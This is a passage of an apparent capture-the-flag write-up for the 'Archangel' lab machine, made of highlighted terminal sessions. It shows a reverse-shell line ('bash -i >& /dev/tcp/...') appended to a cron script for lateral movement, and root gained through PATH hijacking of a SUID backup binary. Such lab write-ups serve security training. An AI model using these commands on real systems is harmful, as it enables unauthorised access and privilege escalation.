<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="o">^</span><span class="n">Z</span>
<span class="n">zsh</span><span class="p">:</span><span class="w"> </span><span class="n">suspended</span><span class="w">  </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9001</span>

<span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">git</span><span class="o">/</span><span class="n">php</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="p">]</span>
<span class="err">└─$</span><span class="w"> </span><span class="n">stty</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="w"> </span><span class="n">fg</span>
<span class="n">stty</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="mi">38</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="mi">116</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="n">continued</span><span class="w">  </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9001</span>

<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">home</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">archangel</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">archangel</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">myfiles</span><span class="w">  </span><span class="n">secret</span><span class="w">  </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>

<span class="err">#</span><span class="w"> </span><span class="n">Unlike</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">crontab</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">don</span><span class="s1">&#39;t have to run the `crontab&#39;</span>
<span class="err">#</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">edit</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">file</span>
<span class="err">#</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">d</span><span class="p">.</span><span class="w"> </span><span class="n">These</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="n">fields</span><span class="p">,</span>
<span class="err">#</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">none</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">crontabs</span><span class="w"> </span><span class="n">do</span><span class="p">.</span>

<span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="k">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>

<span class="err">#</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="n">dom</span><span class="w"> </span><span class="n">mon</span><span class="w"> </span><span class="n">dow</span><span class="w"> </span><span class="k">user</span><span class="w">  </span><span class="n">command</span>
<span class="o">*/</span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">archangel</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">helloworld</span><span class="p">.</span><span class="n">sh</span>
<span class="mi">17</span><span class="w"> </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">hourly</span>
<span class="mi">25</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">daily</span><span class="w"> </span><span class="p">)</span>
<span class="mi">47</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">weekly</span><span class="w"> </span><span class="p">)</span>
<span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="c1">--report /etc/cron.monthly )</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span>
<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="n">backupfiles</span><span class="w">  </span><span class="n">helloworld</span><span class="p">.</span><span class="n">sh</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">helloworld</span><span class="p">.</span><span class="n">sh</span>
<span class="n">cat</span><span class="w"> </span><span class="n">helloworld</span><span class="p">.</span><span class="n">sh</span>
<span class="err">#!</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">echo</span><span class="w"> </span><span class="ss">&quot;hello world&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">backupfiles</span><span class="o">/</span><span class="n">helloworld</span><span class="p">.</span><span class="n">txt</span>
<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="ss">&quot;bash -i &gt;&amp; /dev/tcp/192.168.153.193/9002 0&gt;&amp;1&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">helloworld</span><span class="p">.</span><span class="n">sh</span>
<span class="n">lloworld</span><span class="p">.</span><span class="n">sh</span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">attacker</span><span class="o">-</span><span class="n">ip</span><span class="o">/</span><span class="mi">9002</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="err">&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">hel</span>
</code></pre></div>

<blockquote>
<p>wait a min</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9002</span>
<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9002</span><span class="w"> </span><span class="p">...</span>
<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">192.168.153.193</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.65.140.204</span><span class="o">]</span><span class="w"> </span><span class="mi">59824</span>
<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="p">(</span><span class="mi">992</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
<span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="n">myfiles</span>
<span class="n">secret</span>
<span class="k">user</span><span class="p">.</span><span class="n">txt</span>
<span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">secret</span>
<span class="n">cd</span><span class="w"> </span><span class="n">secret</span>
<span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="k">backup</span>
<span class="n">user2</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="k">backup</span><span class="w">  </span><span class="n">user2</span><span class="p">.</span><span class="n">txt</span>
<span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">$</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="k">backup</span>
<span class="n">strings</span><span class="w"> </span><span class="k">backup</span>
<span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">setuid</span>
<span class="k">system</span>
<span class="n">__cxa_finalize</span>
<span class="n">setgid</span>
<span class="n">__libc_start_main</span>
<span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
<span class="n">GLIBC_2</span><span class="mf">.2.5</span>
<span class="n">_ITM_deregisterTMCloneTable</span>
<span class="n">__gmon_start__</span>
<span class="n">_ITM_registerTMCloneTable</span>
<span class="n">u</span><span class="o">+</span><span class="n">UH</span>
<span class="err">[]</span><span class="n">A</span><span class="err">\</span><span class="n">A</span><span class="err">]</span><span class="n">A</span><span class="o">^</span><span class="n">A_</span>
<span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">myfiles</span><span class="cm">/* /opt/backupfiles</span>
<span class="cm">:*3$&quot;</span>
<span class="cm">GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0</span>
<span class="cm">/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o</span>
<span class="cm">__a</span>
</code></pre></div>

<blockquote>
<p><code>cp /home/user/archangel/myfiles/* /opt/backupfiles</code></p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">archangel</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">secret</span><span class="o">$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">PATH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>
<span class="n">sr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bincal</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">us</span>
<span class="n">archangel</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">secret</span><span class="o">$</span><span class="w">  </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span><span class="o">/</span><span class="n">cp</span>
<span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span><span class="o">/</span><span class="n">cp</span>
<span class="n">archangel</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">secret</span><span class="o">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;$PATH&quot;</span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span>
<span class="o">./</span><span class="n">backupecho</span><span class="w"> </span><span class="s2">&quot;$PATH&quot;</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>
<span class="n">archangel</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">secret</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">archangel</span><span class="o">/</span><span class="n">secret</span>
<span class="n">total</span><span class="w"> </span><span class="mi">36</span>
<span class="n">drwxrwx</span><span class="o">---</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">archangel</span><span class="w"> </span><span class="n">archangel</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="n">Dec</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="n">archangel</span><span class="w"> </span><span class="n">archangel</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="o">..</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="n">root</span><span class="w">      </span><span class="mi">16904</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">backup</span>
<span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">archangel</span><span class="w"> </span><span class="n">archangel</span><span class="w">    </span><span class="mi">13</span><span class="w"> </span><span class="n">Dec</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="w"> </span><span class="n">cp</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="n">root</span><span class="w">         </span><span class="mi">49</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">19</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">user2</span><span class="o">.</span><span class="n">txt</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">archangel</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">$</span><span class="w"> </span><span class="k">backup</span>
<span class="k">backup</span>
<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="k">backup</span><span class="w">  </span><span class="n">cp</span><span class="w">  </span><span class="n">user2</span><span class="p">.</span><span class="n">txt</span>
<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~/</span><span class="n">secret</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span>
<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span>
<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">root</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span>
<span class="n">ls</span>
<span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">root</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
        </div>
    </article>

    <!-- Footer -->
    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>